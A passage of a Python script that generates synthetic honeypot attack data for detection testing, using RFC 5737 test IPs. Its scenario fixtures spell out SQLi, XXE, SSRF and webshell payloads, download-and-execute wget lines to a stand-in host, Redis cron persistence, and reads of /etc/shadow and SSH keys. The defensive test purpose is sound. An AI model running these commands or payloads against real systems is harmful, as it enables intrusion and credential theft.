# -*- coding: utf-8 -*-
"""生成并可选导入“蜜罐合成攻击数据”。

所有 IP 均来自 RFC 5737 文档保留网段（192.0.2.0/24、198.51.100.0/24、
203.0.113.0/24），不对应真实受害目标；所有口令、Cookie、命令均为演示样本。
数据只写入本机 SQLite，不发起任何网络请求。

用法：
    python scripts/generate_attack_data.py
    python scripts/generate_attack_data.py --load
    python scripts/generate_attack_data.py --load --reset-demo
    python scripts/generate_attack_data.py --list
"""
import argparse
import csv
import hashlib
import json
import random
import sqlite3
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
DEFAULT_OUT = ROOT / 'data' / 'attack_samples'
DEFAULT_DB = ROOT / 'database' / 'event_logs.db'
BEIJING = timezone(timedelta(hours=8))

EVENT_LABELS = {
    'web_probe': 'Web探测',
    'file_probe': '敏感文件探测',
    'admin_probe': '后台入口探测',
    'scanner_probe': '扫描器探测',
    'sqli_probe': 'SQL注入探测',
    'xss_probe': 'XSS探测',
    'lfi_probe': '目录穿越探测',
    'ssti_probe': '模板注入探测',
    'ssrf_probe': 'SSRF探测',
    'xxe_probe': 'XXE探测',
    'webshell_probe': 'WebShell探测',
    'exploit_attempt': '漏洞利用尝试',
    'ssh_login_failed': 'SSH登录失败',
    'ssh_login_success': 'SSH登录成功',
    'ssh_bruteforce_ban': 'SSH爆破封禁',
    'ssh_port_scan_probe': 'SSH端口探测',
    'ssh_cmd_suspicious': 'SSH可疑命令',
    'ssh_cmd_high_risk': 'SSH高危命令',
    'ssh_cmd_audit': 'SSH命令审计',
    'scp_upload': 'SCP上传',
    'db_auth_attempt': 'MySQL认证失败',
    'db_auth_success': 'MySQL登录成功',
    'db_query': 'MySQL查询',
    'redis_unauthorized': 'Redis未授权访问',
    'redis_command': 'Redis命令',
    'ftp_login_attempt': 'FTP登录尝试',
    'ftp_login_success': 'FTP登录成功',
    'ftp_directory_list': 'FTP目录枚举',
    'ftp_data_theft': 'FTP数据读取',
    'telnet_login_attempt': 'Telnet登录尝试',
    'telnet_login_success': 'Telnet登录成功',
    'telnet_command': 'Telnet命令',
    'telnet_malware_download': 'Telnet恶意下载',
}


def _web(method, path, query='', body='', score=40, etype='web_probe', label='',
         tags=(), signals=(), referer='', content_type=''):
    return {
        'kind': 'web',
        'method': method,
        'path': path,
        'query': query,
        'body': body,
        'score': int(score),
        'event_type': etype,
        'label': label,
        'tags': list(tags),
        'signals': list(signals),
        'referer': referer,
        'content_type': content_type,
    }


def _proto(source, etype, score, payload, tags=(), signals=(), extra=None):
    return {
        'kind': 'proto',
        'source': source,
        'event_type': etype,
        'score': int(score),
        'payload': payload,
        'tags': list(tags),
        'signals': list(signals),
        'extra': dict(extra or {}),
    }


SCENARIOS = [
    {
        'key': 'web_scanner',
        'title': '公网扫描器：目录与敏感文件快速枚举',
        'ip': '203.0.113.17',
        'ua': 'sqlmap/1.8.7#stable (https://sqlmap.org)',
        'start_min_ago': 1320,
        'gap_min': 0.9,
        'steps': [
            _web('GET', '/', score=42, etype='scanner_probe', label='扫描器根路径探测',
                 tags=['scanner', 'sqlmap'], signals=['扫描工具特征: sqlmap']),
            _web('GET', '/.env', score=48, etype='file_probe',
                 tags=['sensitive_file'], signals=['敏感路径: /.env']),
            _web('GET', '/.git/config', score=46, etype='file_probe',
                 tags=['sensitive_file'], signals=['敏感路径: /.git']),
            _web('GET', '/admin', score=38, etype='admin_probe',
                 tags=['admin_scan'], signals=['敏感路径: /admin']),
            _web('GET', '/wp-login.php', score=36, etype='admin_probe',
                 tags=['cms_scan'], signals=['敏感路径: /wp-']),
            _web('GET', '/phpmyadmin/', score=38, etype='admin_probe',
                 tags=['admin_scan'], signals=['敏感路径: /phpmyadmin']),
            _web('GET', '/actuator/env', score=46, etype='scanner_probe',
                 tags=['spring_boot'], signals=['扫描路径特征', '敏感路径: /actuator']),
            _web('GET', '/server-status', score=35, etype='scanner_probe',
                 tags=['apache_status'], signals=['扫描路径特征']),
            _web('GET', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
                 score=52, etype='file_probe', tags=['phpunit', 'rce_probe'],
                 signals=['组件漏洞路径', '敏感文件路径']),
            _web('GET', '/cgi-bin/luci', score=44, etype='scanner_probe',
                 tags=['iot_scan'], signals=['扫描路径特征']),
            _web('GET', '/console/', score=34, etype='admin_probe',
                 tags=['admin_scan'], signals=['敏感路径: /admin']),
            _web('GET', '/favicon.ico', score=8, etype='web_probe', label='静态资源探测',
                 tags=['static']),
        ],
    },
    {
        'key': 'web_sqli_upload',
        'title': '后台撞库、SQL注入与WebShell上传链',
        'ip': '198.51.100.23',
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36',
        'start_min_ago': 1120,
        'gap_min': 1.4,
        'steps': [
            _web('GET', '/', score=8, etype='web_probe', label='首页访问', tags=['recon']),
            _web('GET', '/login', score=12, etype='web_probe', label='登录页访问',
                 tags=['recon'], referer='http://honeypot.local/'),
            _web('POST', '/login', score=34, etype='admin_probe',
                 body='username=admin&password=admin123',
                 content_type='application/x-www-form-urlencoded',
                 tags=['login_attempt'], signals=['登录失败尝试']),
            _web('POST', '/login', score=68, etype='sqli_probe',
                 body="username=admin'--&password=x",
                 content_type='application/x-www-form-urlencoded',
                 tags=['auth_bypass', 'sqli'], signals=['疑似SQL注入特征']),
            _web('GET', '/admin', score=34, etype='admin_probe',
                 tags=['admin_access'], signals=['敏感路径: /admin'],
                 referer='http://honeypot.local/login'),
            _web('GET', '/admin/users', query='sort=id desc--', score=64,
                 etype='sqli_probe', tags=['sqli', 'admin_access'],
                 signals=['SQL注释组合特征']),
            _web('POST', '/admin/upload', score=76, etype='webshell_probe',
                 body='filename=report.php&content=<?php echo "honeypot"; ?>',
                 content_type='multipart/form-data; boundary=demo',
                 tags=['upload', 'webshell'], signals=['上传接口探测', '脚本文件扩展名']),
            _web('GET', '/uploads/report.php', query='cmd=id', score=88,
                 etype='webshell_probe', tags=['webshell', 'cmd_exec'],
                 signals=['疑似WebShell路径', '疑似命令执行特征']),
            _web('GET', '/uploads/report.php', query='cmd=cat%20/etc/passwd', score=92,
                 etype='webshell_probe', tags=['webshell', 'file_read'],
                 signals=['疑似WebShell路径', '疑似命令执行特征']),
            _web('GET', '/admin/audit/log', score=36, etype='admin_probe',
                 tags=['admin_access'], signals=['敏感路径: /admin']),
        ],
    },
    {
        'key': 'web_injection_mix',
        'title': '多技术Web注入：XSS、LFI、SSTI、SSRF、XXE与JNDI',
        'ip': '198.51.100.77',
        'ua': 'Nikto/2.5.0 (Evasions:None)',
        'start_min_ago': 760,
        'gap_min': 1.1,
        'steps': [
            _web('GET', '/search', query='q=%3Cscript%3Ealert(document.cookie)%3C/script%3E',
                 score=54, etype='xss_probe', tags=['xss'], signals=['疑似XSS特征']),
            _web('GET', '/product', query="id=1%20UNION%20SELECT%20username,password%20FROM%20users",
                 score=70, etype='sqli_probe', tags=['sqli'],
                 signals=['疑似SQL注入特征', 'SQL注释组合特征']),
            _web('GET', '/download', query='file=../../../../etc/passwd',
                 score=66, etype='lfi_probe', tags=['lfi'],
                 signals=['目录穿越/LFI特征']),
            _web('GET', '/search', query='name=%7B%7B7*7%7D%7D',
                 score=48, etype='ssti_probe', tags=['ssti'],
                 signals=['疑似SSTI模板注入']),
            _web('GET', '/api/preview',
                 query='url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                 score=72, etype='ssrf_probe', tags=['ssrf', 'cloud_metadata'],
                 signals=['疑似SSRF特征(内网/云元数据)']),
            _web('POST', '/api/preview',
                 body='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                 content_type='application/xml', score=74, etype='xxe_probe',
                 tags=['xxe'], signals=['疑似XXE外部实体注入']),
            _web('GET', '/api/health',
                 score=88, etype='exploit_attempt', label='Log4Shell JNDI探测',
                 tags=['log4j', 'jndi'], signals=['疑似JNDI注入特征'],
                 referer='http://honeypot.local/'),
            _web('GET', '/download', query='file=..%5C..%5Cwindows%5Cwin.ini',
                 score=64, etype='lfi_probe', tags=['lfi', 'windows'],
                 signals=['目录穿越/LFI特征']),
            _web('GET', '/backup/config.php.bak', score=44, etype='file_probe',
                 tags=['sensitive_file'], signals=['敏感文件扩展名']),
        ],
    },
    {
        'key': 'ssh_bruteforce_takeover',
        'title': 'SSH弱口令爆破、登录成功与挖矿脚本下载',
        'ip': '192.0.2.31',
        'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'start_min_ago': 570,
        'gap_min': 1.2,
        'steps': [
            _proto('ssh', 'ssh_port_scan_probe', 35,
                   'SSH 端口探测：客户端版本 SSH-2.0-libssh2_1.10.0',
                   tags=['ssh', 'recon']),
            _proto('ssh', 'ssh_login_failed', 24,
                   'SSH 登录失败 user=root password=123456',
                   tags=['ssh', 'bruteforce'],
                   extra={'username': 'root', 'attempt': 1}),
            _proto('ssh', 'ssh_login_failed', 24,
                   'SSH 登录失败 user=root password=admin888',
                   tags=['ssh', 'bruteforce'],
                   extra={'username': 'root', 'attempt': 2}),
            _proto('ssh', 'ssh_login_failed', 24,
                   'SSH 登录失败 user=admin password=admin',
                   tags=['ssh', 'bruteforce'],
                   extra={'username': 'admin', 'attempt': 3}),
            _proto('ssh', 'ssh_login_failed', 26,
                   'SSH 登录失败 user=ubuntu password=ubuntu',
                   tags=['ssh', 'bruteforce'],
                   extra={'username': 'ubuntu', 'attempt': 4}),
            _proto('ssh', 'ssh_bruteforce_ban', 66,
                   'SSH 爆破触发封禁 600s，来源 192.0.2.31',
                   tags=['ssh', 'bruteforce', 'rate_ban']),
            _proto('ssh', 'ssh_login_success', 72,
                   'SSH 登录成功 user=ubuntu password=<redacted>',
                   tags=['ssh', 'valid_accounts'],
                   extra={'username': 'ubuntu'}),
            _proto('ssh', 'ssh_cmd_suspicious', 44,
                   'SSH 可疑命令: uname -a; id; cat /etc/passwd',
                   tags=['ssh', 'discovery'],
                   extra={'raw_command': 'uname -a; id; cat /etc/passwd'}),
            _proto('ssh', 'ssh_cmd_high_risk', 90,
                   'SSH 高危命令: wget http://203.0.113.17/payload.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x',
                   tags=['ssh', 'download_exec', 'miner'],
                   extra={'raw_command': 'wget http://203.0.113.17/payload.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x'}),
            _proto('ssh', 'ssh_cmd_suspicious', 42,
                   'SSH 可疑命令: crontab -l',
                   tags=['ssh', 'persistence'],
                   extra={'raw_command': 'crontab -l'}),
            _proto('ssh', 'ssh_cmd_audit', 30,
                   'SSH 命令审计: ls -la /tmp',
                   tags=['ssh', 'discovery'],
                   extra={'raw_command': 'ls -la /tmp'}),
            _proto('ssh', 'scp_upload', 78,
                   'SCP 上传捕获: /tmp/miner.tar.gz（仅记录元数据）',
                   tags=['ssh', 'upload', 'miner'],
                   extra={'filename': 'miner.tar.gz', 'size': 184320}),
        ],
    },
    {
        'key': 'ssh_recon_lateral',
        'title': 'SSH账号探测、权限枚举与横向移动准备',
        'ip': '192.0.2.88',
        'ua': 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6',
        'start_min_ago': 300,
        'gap_min': 1.0,
        'steps': [
            _proto('ssh', 'ssh_login_failed', 22,
                   'SSH 登录失败 user=oracle password=oracle',
                   tags=['ssh', 'bruteforce'],
                   extra={'username': 'oracle', 'attempt': 1}),
            _proto('ssh', 'ssh_login_failed', 22,
                   'SSH 登录失败 user=postgres password=postgres',
                   tags=['ssh', 'bruteforce'],
                   extra={'username': 'postgres', 'attempt': 2}),
            _proto('ssh', 'ssh_login_success', 58,
                   'SSH 登录成功 user=ubuntu（蜜罐虚拟账号）',
                   tags=['ssh', 'valid_accounts'],
                   extra={'username': 'ubuntu'}),
            _proto('ssh', 'ssh_cmd_suspicious', 38,
                   'SSH 可疑命令: whoami',
                   tags=['ssh', 'discovery'],
                   extra={'raw_command': 'whoami'}),
            _proto('ssh', 'ssh_cmd_suspicious', 40,
                   'SSH 可疑命令: ip addr',
                   tags=['ssh', 'discovery'],
                   extra={'raw_command': 'ip addr'}),
            _proto('ssh', 'ssh_cmd_high_risk', 76,
                   'SSH 高危命令: cat /etc/shadow',
                   tags=['ssh', 'credential_access'],
                   extra={'raw_command': 'cat /etc/shadow'}),
            _proto('ssh', 'ssh_cmd_high_risk', 64,
                   'SSH 高危命令: sudo -l',
                   tags=['ssh', 'privilege_discovery'],
                   extra={'raw_command': 'sudo -l'}),
            _proto('ssh', 'ssh_cmd_suspicious', 46,
                   'SSH 可疑命令: docker ps',
                   tags=['ssh', 'discovery'],
                   extra={'raw_command': 'docker ps'}),
            _proto('ssh', 'ssh_cmd_suspicious', 42,
                   'SSH 可疑命令: cat /root/.ssh/id_rsa',
                   tags=['ssh', 'credential_access'],
                   extra={'raw_command': 'cat /root/.ssh/id_rsa'}),
        ],
    },
    {
        'key': 'multi_protocol',
        'title': 'MySQL / Redis / FTP / Telnet 多协议机会型攻击',
        'ip': '192.0.2.200',
        'ua': 'python-pymysql/1.1.0 (synthetic)',
        'start_min_ago': 860,
        'gap_min': 1.3,
        'steps': [
            _proto('mysql', 'db_auth_attempt', 42,
                   'MySQL 认证失败 user=root password=123456',
                   tags=['mysql', 'bruteforce'],
                   extra={'protocol': 'mysql', 'username': 'root'}),
            _proto('mysql', 'db_auth_success', 70,
                   'MySQL 登录成功 user=root db=mysql（蜜罐虚拟账号）',
                   tags=['mysql', 'valid_accounts'],
                   extra={'protocol': 'mysql', 'username': 'root', 'database': 'mysql'}),
            _proto('mysql', 'db_query', 86,
                   '命中 union_select,sql_injection; SQL: SELECT * FROM users WHERE id=1 UNION SELECT user,password FROM mysql.user',
                   tags=['mysql', 'sql_injection', 'union_select'],
                   extra={'protocol': 'mysql', 'sql': 'SELECT * FROM users WHERE id=1 UNION SELECT user,password FROM mysql.user'}),
            _proto('mysql', 'db_query', 92,
                   '命中 into_outfile,webshell_write; SQL: SELECT "<?php echo 1;?>" INTO OUTFILE "/var/www/shell.php"',
                   tags=['mysql', 'into_outfile', 'webshell_write'],
                   extra={'protocol': 'mysql', 'sql': 'SELECT "<?php echo 1;?>" INTO OUTFILE "/var/www/shell.php"'}),
            _proto('redis', 'redis_unauthorized', 88,
                   'Redis 未授权访问：PING -> PONG',
                   tags=['redis', 'unauthorized'],
                   extra={'protocol': 'redis', 'command': 'PING'}),
            _proto('redis', 'redis_command', 66,
                   'Redis 敏感命令: CONFIG GET requirepass',
                   tags=['redis', 'config_read'],
                   extra={'protocol': 'redis', 'command': 'CONFIG GET requirepass'}),
            _proto('redis', 'redis_command', 90,
                   'Redis 写入计划任务: SET cron "*/5 * * * * wget http://203.0.113.17/x.sh"',
                   tags=['redis', 'persistence', 'cron'],
                   extra={'protocol': 'redis', 'command': 'SET cron ...'}),
            _proto('ftp', 'ftp_login_attempt', 30,
                   'FTP 匿名登录尝试 user=anonymous',
                   tags=['ftp', 'login_attempt'],
                   extra={'protocol': 'ftp', 'username': 'anonymous'}),
            _proto('ftp', 'ftp_login_success', 56,
                   'FTP 弱口令登录成功 user=admin',
                   tags=['ftp', 'valid_accounts'],
                   extra={'protocol': 'ftp', 'username': 'admin'}),
            _proto('ftp', 'ftp_directory_list', 44,
                   'FTP 目录枚举: LIST /',
                   tags=['ftp', 'discovery'],
                   extra={'protocol': 'ftp', 'command': 'LIST /'}),
            _proto('ftp', 'ftp_data_theft', 82,
                   'FTP 敏感文件读取: RETR /backup/config.zip',
                   tags=['ftp', 'data_theft'],
                   extra={'protocol': 'ftp', 'command': 'RETR /backup/config.zip'}),
            _proto('telnet', 'telnet_login_attempt', 26,
                   'Telnet 登录尝试 user=root password=123456',
                   tags=['telnet', 'bruteforce'],
                   extra={'protocol': 'telnet', 'username': 'root'}),
            _proto('telnet', 'telnet_login_success', 62,
                   'Telnet 登录成功 user=root（蜜罐虚拟账号）',
                   tags=['telnet', 'valid_accounts'],
                   extra={'protocol': 'telnet', 'username': 'root'}),
            _proto('telnet', 'telnet_command', 54,
                   'Telnet 命令: uname -a; cat /etc/passwd',
                   tags=['telnet', 'discovery'],
                   extra={'protocol': 'telnet', 'command': 'uname -a; cat /etc/passwd'}),
            _proto('telnet', 'telnet_malware_download', 94,
                   'Telnet 恶意下载: wget http://203.0.113.17/bot.mips -O /tmp/bot',
                   tags=['telnet', 'malware', 'botnet'],
                   extra={'protocol': 'telnet', 'command': 'wget http://203.0.113.17/bot.mips -O /tmp/bot'}),
        ],
    },
    {
        'key': 'web_sensitive_files',
        'title': '备份、配置与源码泄露探测',
        'ip': '203.0.113.45',
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'start_min_ago': 130,
        'gap_min': 0.6,
        'steps': [
            _web('GET', '/.env', score=44, etype='file_probe',
                 tags=['sensitive_file'], signals=['敏感路径: /.env']),
            _web('GET', '/backup.zip', score=46, etype='file_probe',
                 tags=['backup'], signals=['敏感文件扩展名']),
            _web('GET', '/dump.sql', score=48, etype='file_probe',
                 tags=['database_dump'], signals=['敏感文件扩展名']),
            _web('GET', '/.git/HEAD', score=42, etype='file_probe',
                 tags=['source_leak'], signals=['敏感路径: /.git']),
            _web('GET', '/config.php.bak', score=44, etype='file_probe',
                 tags=['source_leak'], signals=['敏感文件扩展名']),
            _web('GET', '/phpinfo.php', score=36, etype='file_probe',
                 tags=['info_disclosure'], signals=['敏感文件路径']),
            _web('GET', '/admin/config.php', score=38, etype='admin_probe',
                 tags=['admin_access'], signals=['敏感路径: /admin']),
            _web('GET', '/uploads/', score=30, etype='file_probe',
                 tags=['directory_listing'], signals=['目录枚举']),
            _web('GET', '/api/swagger.json', score=30, etype='admin_probe',
                 tags=['api_docs'], signals=['接口文档探测']),
            _web('GET', '/actuator/heapdump', score=52, etype='file_probe',
                 tags=['spring_boot', 'heapdump'], signals=['敏感路径: /actuator']),
        ],
    },
    {
        'key': 'api_abuse',
        'title': 'API枚举、GraphQL内省与越权参数探测',
        'ip': '203.0.113.99',
        'ua': 'Mozilla/5.0 (X11; Linux x86_64) curl/8.5.0',
        'start_min_ago': 50,
        'gap_min': 0.8,
        'steps': [
            _web('GET', '/api/v1/users', query='limit=1000', score=46,
                 etype='admin_probe', tags=['api_enum'], signals=['批量用户枚举']),
            _web('GET', '/api/v1/users/1', score=34, etype='admin_probe',
                 tags=['idor_probe'], signals=['对象ID枚举']),
            _web('GET', '/api/v1/users/2', score=36, etype='admin_probe',
                 tags=['idor_probe'], signals=['对象ID枚举']),
            _web('POST', '/api/v1/auth/login',
                 body='{"username":"admin","password":{"$ne":null}}',
                 content_type='application/json', score=70, etype='sqli_probe',
                 tags=['nosql_injection', 'auth_bypass'],
                 signals=['NoSQL操作符注入', '认证绕过探测']),
            _web('GET', '/graphql', query='query={__schema{types{name}}}',
                 score=46, etype='scanner_probe', tags=['graphql', 'introspection'],
                 signals=['GraphQL内省探测']),
            _web('POST', '/graphql',
                 body='{"query":"query{__schema{queryType{fields{name}}}}"}',
                 content_type='application/json', score=44, etype='scanner_probe',
                 tags=['graphql', 'introspection'], signals=['GraphQL内省探测']),
            _web('GET', '/.well-known/openid-configuration', score=14,
                 etype='web_probe', label='OIDC配置探测', tags=['recon']),
            _web('POST', '/api/v1/admin/export',
                 body='{"role":"admin","format":"csv"}',
                 content_type='application/json', score=58, etype='exploit_attempt',
                 tags=['mass_assignment', 'privilege_escalation'],
                 signals=['越权参数探测', '导出接口滥用']),
        ],
    },
]


def _bp_now():
    return datetime.now(BEIJING).replace(tzinfo=None, microsecond=0)


def _severity(score, source=''):
    if score >= 80:
        return 'critical'
    if score >= 60:
        return 'high'
    # Web 事件一旦进入可疑阈值（>=20）就至少记为 medium，
    # 与 db/http_requests.py 的 _severity_for_web_score 保持一致。
    if score >= 40 or (source == 'web' and score >= 20):
        return 'medium'
    return 'low'


def _event_payload(step):
    if step['kind'] == 'proto':
        return step['payload']
    method = step['method']
    path = step['path']
    query = step['query']
    body = step['body']
    label = step['label'] or EVENT_LABELS.get(step['event_type'], 'Web探测')
    text = '[%s] %s %s' % (label, method, path)
    if query:
        text += '?' + query
    if body:
        preview = body.replace('\n', ' ')[:160]
        text += ' | body=' + preview
    return text


def _web_raw(step, timestamp, dataset_id):
    body = step['body'] or ''
    headers = {
        'Host': 'honeypot.local',
        'User-Agent': step.get('ua', ''),
        'Accept': 'text/html,application/json;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'X-Honeypot-Demo': 'synthetic-' + dataset_id,
    }
    if step.get('referer'):
        headers['Referer'] = step['referer']
    content_type = step.get('content_type') or ''
    if not content_type and body:
        if body.lstrip().startswith('<'):
            content_type = 'application/xml'
        elif body.lstrip().startswith(('{', '[')):
            content_type = 'application/json'
        else:
            content_type = 'application/x-www-form-urlencoded'
    if content_type:
        headers['Content-Type'] = content_type
    return {
        'method': step['method'],
        'path': step['path'],
        'query_string': step['query'],
        'headers': headers,
        'body': body,
        'user_agent': step.get('ua', ''),
        'referer': step.get('referer', ''),
        'content_type': content_type,
        'content_length': len(body.encode('utf-8')),
        'is_suspicious': 1 if step['score'] >= 20 else 0,
        'threat_score': step['score'],
        'create_time': timestamp,
    }


def build_bundle(seed):
    now = _bp_now()
    digest = hashlib.sha1(('%s|%s' % (seed, now.isoformat())).encode('utf-8')).hexdigest()[:6]
    dataset_id = 'd' + now.strftime('%Y%m%d%H%M%S') + digest
    rng = random.Random(seed)

    events = []
    sessions = []
    scenario_meta = []
    for scenario in SCENARIOS:
        start = now - timedelta(minutes=scenario['start_min_ago'])
        cursor = 0.0
        web_steps = []
        for step in scenario['steps']:
            cursor += scenario['gap_min'] + rng.uniform(-0.1, 0.1)
            ts = start + timedelta(minutes=max(0.0, cursor))
            if ts > now:
                ts = now - timedelta(seconds=30)
            ts_text = ts.strftime('%Y-%m-%d %H:%M:%S')
            session_id = 'synth-%s-%s' % (dataset_id, scenario['key'])
            score = int(step['score'])
            source = step.get('source', 'web')
            event_type = step['event_type']
            tags = ['synthetic', source, event_type] + [str(t) for t in step['tags']]
            tags = list(dict.fromkeys(tags))[:12]
            extra = {
                'score': score,
                'signals': list(step['signals']),
                'dataset': dataset_id,
                'synthetic': True,
                'protocol': source,
                'location_scope': 'RFC 5737 TEST-NET',
            }
            raw = None
            if step['kind'] == 'web':
                if not step.get('ua'):
                    step['ua'] = scenario['ua']
                raw = _web_raw(step, ts_text, dataset_id)
                extra.update({
                    'method': step['method'],
                    'path': step['path'],
                    'ua': step.get('ua', ''),
                })
                web_steps.append((ts_text, step['path']))
            else:
                extra.update(step.get('extra') or {})
            extra.update({'event_uid': 'evt-%04d' % (len(events) + 1)})
            events.append({
                'event_id': 'evt-%04d' % (len(events) + 1),
                'timestamp': ts_text,
                'source': source,
                'severity': _severity(score, source),
                'event_type': event_type,
                'src_ip': scenario['ip'],
                'session_id': session_id,
                'tags': tags,
                'payload': _event_payload(step),
                'extra': extra,
                'raw_request': raw,
            })

        if web_steps:
            times = [x[0] for x in web_steps]
            max_score = max(int(s['score']) for s in scenario['steps'] if s['kind'] == 'web')
            count = len(web_steps)
            if max_score >= 60 or count >= 50:
                level = 'high'
            elif max_score >= 40 or count >= 20:
                level = 'medium'
            else:
                level = 'low'
            sessions.append({
                'session_id': 'synth-%s-%s' % (dataset_id, scenario['key']),
                'src_ip': scenario['ip'],
                'first_seen': min(times),
                'last_seen': max(times),
                'request_count': count,
                'path_sequence': '|'.join(p for _, p in web_steps[-20:]),
                'is_attacker': 1,
                'threat_level': level,
            })
        scenario_meta.append({
            'key': scenario['key'],
            'title': scenario['title'],
            'src_ip': scenario['ip'],
            'events': len(scenario['steps']),
            'web_requests': len(web_steps),
        })

    events.sort(key=lambda x: (x['timestamp'], x['event_id']))
    for i, event in enumerate(events, 1):
        event['event_id'] = 'evt-%04d' % i
        event['extra']['event_uid'] = event['event_id']

    ips = sorted({s['ip'] for s in SCENARIOS})
    geoip = [
        {'ip': '203.0.113.17', 'country': '美国', 'province': '弗吉尼亚州', 'city': '阿什本',
         'latitude': 39.0438, 'longitude': -77.4874, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '203.0.113.45', 'country': '德国', 'province': '黑森州', 'city': '法兰克福',
         'latitude': 50.1109, 'longitude': 8.6821, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '203.0.113.99', 'country': '新加坡', 'province': '新加坡', 'city': '新加坡',
         'latitude': 1.3521, 'longitude': 103.8198, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '198.51.100.23', 'country': '日本', 'province': '东京都', 'city': '东京',
         'latitude': 35.6895, 'longitude': 139.6917, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '198.51.100.77', 'country': '巴西', 'province': '圣保罗州', 'city': '圣保罗',
         'latitude': -23.5505, 'longitude': -46.6333, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '192.0.2.31', 'country': '俄罗斯', 'province': '莫斯科', 'city': '莫斯科',
         'latitude': 55.7558, 'longitude': 37.6173, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '192.0.2.88', 'country': '英国', 'province': '伦敦', 'city': '伦敦',
         'latitude': 51.5074, 'longitude': -0.1278, 'isp': 'Synthetic Lab / RFC 5737'},
        {'ip': '192.0.2.200', 'country': '中国', 'province': '香港', 'city': '香港',
         'latitude': 22.3193, 'longitude': 114.1694, 'isp': 'Synthetic Lab / RFC 5737'},
    ]
    geoip = [g for g in geoip if g['ip'] in ips]

    source_counts = {}
    severity_counts = {}
    for event in events:
        source_counts[event['source']] = source_counts.get(event['source'], 0) + 1
        severity_counts[event['severity']] = severity_counts.get(event['severity'], 0) + 1

    return {
        'dataset': {
            'id': dataset_id,
            'name': '蜜罐合成攻击数据集',
            'version': 1,
            'generated_at': now.replace(tzinfo=BEIJING).isoformat(timespec='seconds'),
            'timezone': 'Asia/Shanghai',
            'synthetic': True,
            'scope': '仅用于本机蜜罐演示、检测规则验证和 Dashboard 可视化。',
            'ip_policy': '全部来源 IP 使用 RFC 5737 文档保留网段，ISP 标注为 Synthetic Lab。',
            'event_count': len(events),
            'scenario_count': len(SCENARIOS),
            'source_counts': source_counts,
            'severity_counts': severity_counts,
            'window_start': events[0]['timestamp'] if events else '',
            'window_end': events[-1]['timestamp'] if events else '',
        },
        'scenarios': scenario_meta,
        'geoip': geoip,
        'sessions': sessions,
        'events': events,
    }


def _backup_database(db_path, backup_path):
    src = sqlite3.connect(str(db_path))
    try:
        dst = sqlite3.connect(str(backup_path))
        try:
            src.backup(dst)
        finally:
            dst.close()
    finally:
        src.close()


SCHEMA_SQL = [
    '''CREATE TABLE IF NOT EXISTS geo_ip (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL UNIQUE,
        country TEXT, province TEXT, city TEXT,
        latitude REAL, longitude REAL, isp TEXT,
        update_time DATETIME DEFAULT CURRENT_TIMESTAMP
    )''',
    '''CREATE TABLE IF NOT EXISTS raw_request (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        src_ip TEXT NOT NULL,
        method TEXT,
        path TEXT,
        query_string TEXT,
        headers TEXT,
        body TEXT,
        user_agent TEXT,
        referer TEXT,
        content_type TEXT,
        content_length INTEGER DEFAULT 0,
        is_suspicious INTEGER DEFAULT 0,
        threat_score INTEGER DEFAULT 0,
        create_time DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    )''',
    '''CREATE TABLE IF NOT EXISTS session_track (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT NOT NULL UNIQUE,
        src_ip TEXT NOT NULL,
        first_seen DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        last_seen DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        request_count INTEGER DEFAULT 1,
        path_sequence TEXT,
        is_attacker INTEGER DEFAULT 0,
        threat_level TEXT DEFAULT 'unknown'
    )''',
    '''CREATE TABLE IF NOT EXISTS event_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        source TEXT NOT NULL,
        severity TEXT NOT NULL,
        event_type TEXT NOT NULL,
        src_ip TEXT DEFAULT '',
        session_id TEXT DEFAULT '',
        tags TEXT,
        payload TEXT,
        raw_ref TEXT DEFAULT '',
        raw_request_id INTEGER DEFAULT NULL,
        extra TEXT
    )''',
]


def import_bundle(bundle, db_path, reset_demo=False):
    db_path = Path(db_path)
    db_path.parent.mkdir(parents=True, exist_ok=True)
    backup_path = None
    if db_path.exists() and db_path.stat().st_size > 0:
        stamp = datetime.now(BEIJING).strftime('%Y%m%d_%H%M%S')
        backup_path = db_path.with_name(db_path.name + '.bak-' + stamp)
        _backup_database(db_path, backup_path)

    conn = sqlite3.connect(str(db_path))
    try:
        for sql in SCHEMA_SQL:
            conn.execute(sql)
        conn.execute('CREATE INDEX IF NOT EXISTS idx_raw_ip ON raw_request(src_ip)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_raw_session ON raw_request(session_id)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_event_time ON event_log(timestamp)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_event_source ON event_log(source)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_event_ip ON event_log(src_ip)')
        conn.commit()

        deleted = 0
        if reset_demo:
            for table in ('event_log', 'raw_request', 'session_track'):
                cur = conn.execute("DELETE FROM %s WHERE session_id LIKE 'synth-%%'" % table)
